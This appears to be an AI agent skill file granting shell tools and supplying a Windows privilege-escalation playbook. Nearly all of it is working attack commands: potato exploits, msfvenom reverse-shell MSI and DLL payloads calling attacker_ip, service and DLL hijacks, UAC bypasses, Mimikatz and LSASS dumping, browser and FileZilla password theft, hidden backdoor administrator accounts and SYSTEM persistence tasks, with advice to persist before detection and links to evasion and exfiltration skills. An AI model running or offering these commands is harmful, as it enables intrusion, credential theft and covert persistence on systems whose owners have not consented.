---
name: windows-privesc
description: Comprehensive Windows privilege escalation techniques including token manipulation, service exploitation, DLL hijacking, and UAC bypass methods
allowed-tools: Bash, Read, Write, Grep
---

# Windows Privilege Escalation Skill

## Purpose
Provides systematic Windows privilege escalation techniques from low-privilege users to SYSTEM/Administrator, including automated enumeration, token manipulation, and exploitation methods.

## Automated Enumeration

### Enumeration Scripts
```powershell
# WinPEAS
.\winPEASx64.exe
.\winPEASx86.exe quiet systeminfo userinfo

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=user

# JAWS
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt

# Watson (for missing patches)
.\Watson.exe
```

## System Information Gathering

### Basic System Enumeration
```cmd
# System info
systeminfo
hostname
echo %USERNAME%

# Network information
ipconfig /all
route print
arp -A
netstat -ano

# Firewall & Defender
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
sc query windefend
sc queryex type=service

# Environment variables
set
echo %PATH%
```

### User & Group Enumeration
```cmd
# Current user
whoami
whoami /priv
whoami /groups
whoami /all

# All users
net users
net user %USERNAME%
net localgroup
net localgroup administrators

# Domain information
net user /domain
net group /domain
net group "Domain Admins" /domain
```

## Token Privilege Exploitation

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
```powershell
# Check for privilege
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"

# JuicyPotato (Windows 7/8/Server 2008/2012)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user admin Password123! /add" -t * -c {CLSID}

# Common CLSIDs
# Windows 7 Enterprise: {555F3418-D99E-4E51-800A-6E89CFD8B1D7}
# Windows 8.1 Enterprise: {3c6859ce-230b-48a4-be6c-932c0c202048}
# Windows Server 2012: {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# RoguePotato (newer versions)
.\RoguePotato.exe -r attacker_ip -e "cmd.exe /c net user admin Password123! /add" -l 9999

# PrintSpoofer (Windows 10/Server 2016+)
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "net user admin Password123! /add"

# GodPotato (Windows 10/Server 2012+)
.\GodPotato.exe -cmd "cmd.exe /c whoami"
```

### SeDebugPrivilege
```powershell
# Exploit with process injection
# Migrate to SYSTEM process
.\psgetsystem.ps1

# Or use Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "exit"
```

### SeBackupPrivilege
```cmd
# Copy SAM and SYSTEM
reg save hklm\sam C:\sam
reg save hklm\system C:\system

# Copy any file
robocopy /b C:\Users\Administrator\Desktop\ C:\temp\

# Using diskshadow
diskshadow> set context persistent nowriters
diskshadow> add volume c: alias temp
diskshadow> create
diskshadow> expose %temp% z:
# Now copy from z:
```

### SeTakeOwnershipPrivilege
```cmd
# Take ownership of file
takeown /f "C:\Windows\System32\config\SAM"
icacls "C:\Windows\System32\config\SAM" /grant %USERNAME%:F
```

## Service Exploitation

### Service Enumeration
```cmd
# List all services
sc queryex type=service
wmic service list brief
net start

# Get service details
sc qc servicename
sc query servicename

# Service permissions
sc sdshow servicename
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwdq "C:\Program Files"
```

### Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Where-Object {$_.PathName -like '* *'} | Where-Object {$_.PathName -notlike '"*'} | Select Name, PathName

# Exploit
# If path: C:\Program Files\Some Service\service.exe
# Create: C:\Program.exe
# Restart service
```

### Weak Service Permissions
```cmd
# Find modifiable services
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc sdset servicename "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)"

# Modify service binary path
sc config servicename binpath= "cmd.exe /c net user admin Password123! /add"
sc stop servicename
sc start servicename

# Restore original
sc config servicename binpath= "original_path.exe"
```

### Insecure Service Executables
```cmd
# Find writable service executables
accesschk.exe /accepteula -uwqv "C:\Program Files\*"
icacls "C:\Program Files\Service\*" | findstr /i "(F) (M) (W)"

# Replace executable
move "C:\Program Files\Service\service.exe" "C:\Program Files\Service\service.exe.bak"
copy malicious.exe "C:\Program Files\Service\service.exe"
sc stop servicename
sc start servicename
```

## Registry Exploitation

### AutoRuns
```cmd
# Check AutoRun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Check permissions
accesschk.exe /accepteula -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Add autorun
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\temp\backdoor.exe"
```

### AlwaysInstallElevated
```cmd
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit with MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# Or create custom MSI
wixl -o privesc.msi privesc.wxs
```

## DLL Hijacking

### DLL Search Order Hijacking
```cmd
# Find missing DLLs
# Use Process Monitor (ProcMon) to identify NAME NOT FOUND DLLs

# Common vulnerable paths
C:\
C:\Windows\System32\
C:\Program Files\App\

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll > hijack.dll

# Place in search path
copy hijack.dll "C:\Program Files\VulnerableApp\"
```

### DLL Side-Loading
```powershell
# Find signed executables loading DLLs from writable locations
Get-Process | ForEach-Object {
  $process = $_
  $modules = $process.Modules | Where-Object {$_.FileName -notlike "C:\Windows\*"}
  if($modules) {
    Write-Host $process.Name
    $modules | ForEach-Object {Write-Host "  $_"}
  }
}
```

### Phantom DLL Hijacking
```cmd
# Common phantom DLLs
# IEFrame.dll loaded by explorer.exe
# Create malicious IEFrame.dll in a location searched before System32

# Template DLL code
/*
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    system("cmd.exe /c net user admin Password123! /add");
  }
  return TRUE;
}
*/
```

## Scheduled Tasks Exploitation

### Enumerate Scheduled Tasks
```cmd
# List all scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "Task To Run:"

# PowerShell enumeration
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Format-Table TaskName,TaskPath,State

# Check task file permissions
icacls C:\path\to\scheduled\task.exe
accesschk.exe /accepteula -quvw C:\path\to\scheduled\task.exe
```

### Exploit Writable Tasks
```cmd
# Replace task executable
move task.exe task.exe.bak
copy malicious.exe task.exe

# Modify task
schtasks /Change /TN "TaskName" /TR "C:\temp\backdoor.exe"

# Create new task
schtasks /create /tn "SystemUpdate" /tr "C:\temp\backdoor.exe" /sc onlogon /ru SYSTEM
```

## UAC Bypass Techniques

### Fodhelper Bypass
```cmd
# Windows 10 UAC bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c start C:\temp\backdoor.exe" /f
fodhelper.exe

# Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

### EventVwr Bypass
```cmd
# Event Viewer UAC bypass
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\temp\backdoor.exe" /f
eventvwr.exe

# Cleanup
reg delete HKCU\Software\Classes\mscfile /f
```

### CMSTP Bypass
```powershell
# Create INF file
$inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection

[RegisterOCXSection]
%11%\scrobj.dll,NI,{C:\temp\backdoor.exe}

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="VPN"
ShortSvcName="VPN"
"@

$inf | Out-File -FilePath "C:\temp\bypass.inf"

# Execute
C:\Windows\System32\cmstp.exe /au "C:\temp\bypass.inf"
```

## Credential Harvesting

### Extract from Registry
```cmd
# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"

# SNMP strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"

# Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### Saved Credentials
```cmd
# List saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="ProfileName" key=clear

# Credential Manager
rundll32.exe keymgr.dll,KRShowKeyMgr
```

### Memory Extraction
```powershell
# Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"

# Procdump + Mimikatz
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# SafetyKatz (base64 encoded Mimikatz)
.\SafetyKatz.exe
```

## Kernel Exploits

### Kernel Version Check
```cmd
# Get detailed OS info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic os get Caption,Version,BuildNumber,OSArchitecture

# Check patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe list brief

# Missing patches
# Use Windows-Exploit-Suggester
python windows-exploit-suggester.py --database 2024-12.xlsx --systeminfo systeminfo.txt
```

### Common Kernel Exploits
```cmd
# MS16-032 (Secondary Logon Handle)
.\MS16-032.ps1
Invoke-MS16032 -Command "cmd.exe /c net user admin Password123! /add"

# MS16-135 (Win32k Elevation of Privilege)
.\MS16-135.exe

# CVE-2020-0796 (SMBGhost) - Windows 10 1903/1909
.\CVE-2020-0796.exe

# CVE-2021-1675/CVE-2021-34527 (PrintNightmare)
.\CVE-2021-1675.ps1
```

## Application Exploits

### Installed Software Enumeration
```cmd
# List installed programs
wmic product get name,version
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"

# 32-bit on 64-bit
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"

# Check running processes
tasklist /svc
Get-Process | Select-Object ProcessName, Path
```

### Common Vulnerable Applications
```cmd
# VNC (weak authentication)
reg query "HKCU\Software\ORL\WinVNC3\Password"

# FileZilla (plaintext passwords)
type "%APPDATA%\FileZilla\recentservers.xml"
type "%APPDATA%\FileZilla\sitemanager.xml"

# Browsers (saved passwords)
# Chrome
python ChromePass.py
# Firefox
python firefox_decrypt.py
```

## Persistence After Privilege Escalation

### Create Backdoor Admin
```cmd
# Add user
net user backdoor Password123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

# Hide user (add $ to username)
net user backdoor$ Password123! /add
net localgroup administrators backdoor$ /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor$ /t REG_DWORD /d 0 /f
```

### Registry Persistence
```cmd
# Startup
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /d "C:\Windows\Temp\backdoor.exe" /f

# Debugger hijack
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

### Scheduled Task Persistence
```cmd
# SYSTEM level task
schtasks /create /sc minute /mo 1 /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /ru "SYSTEM" /rl highest /f

# On idle
schtasks /create /sc onidle /i 1 /tn "Maintenance" /tr "C:\Windows\Temp\backdoor.exe" /ru "SYSTEM"
```

## Best Practices

1. **Run automated enumeration first** - WinPEAS, PowerUp
2. **Check token privileges immediately** - Often quickest path
3. **Look for credentials everywhere** - Registry, files, memory
4. **Test service permissions** - Common misconfiguration
5. **Check scheduled tasks** - Often overlooked
6. **Be careful with kernel exploits** - Can crash systems
7. **Establish persistence quickly** - Before detection

## Integration Notes

- Works with active-directory for domain escalation
- Combines with credential-harvesting for password extraction
- Uses persistence-techniques for maintaining access
- Leverages evasion-techniques to avoid detection
- Coordinates with data-exfiltration for stealing data